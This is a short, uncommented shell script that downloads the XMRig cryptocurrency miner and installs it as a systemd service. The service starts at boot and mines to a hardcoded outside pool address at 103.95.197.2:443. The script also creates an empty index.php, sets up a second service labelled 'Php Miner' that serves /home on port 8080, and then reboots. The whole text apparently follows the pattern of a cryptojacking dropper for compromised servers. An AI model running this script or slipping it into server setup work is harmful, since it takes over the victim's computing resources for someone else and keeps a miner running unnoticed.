cd /home
apt-get update
touch index.php
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/xmrig-6.16.2/xmrig -o 103.95.197.2:443 --randomx-no-rdmsr --tls true\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
systemctl daemon-reload
systemctl enable xmrig.service
bash -c 'echo -e "[Unit]\nDescription=Php Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=php -S 0.0.0.0:8080 -t /home\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/php.service'
systemctl daemon-reload
systemctl enable php.service
reboot
